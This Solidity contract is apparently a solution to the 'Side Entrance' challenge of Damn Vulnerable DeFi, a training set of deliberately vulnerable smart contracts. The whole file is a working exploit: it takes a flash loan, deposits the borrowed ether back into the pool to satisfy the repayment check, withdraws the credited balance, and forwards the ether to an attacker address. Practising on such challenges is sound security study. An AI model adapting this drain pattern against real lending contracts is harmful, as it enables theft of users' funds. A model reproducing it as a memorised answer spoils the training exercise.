// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


/**
 * @title SideEntranceAttacker
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceAttacker is IFlashLoanEtherReceiver {
  SideEntranceLenderPool private immutable pool;
  address payable attacker;

  constructor(address _pool, address _attacker) {
    pool = SideEntranceLenderPool(_pool);
    attacker = payable(_attacker);
  }

  function attack(uint256 amount) external {
    pool.flashLoan(amount);
    pool.withdraw();
  }

  function execute() external payable override {
    pool.deposit{value: msg.value}();
  }

  receive() external payable {
    attacker.transfer(msg.value);
  }
}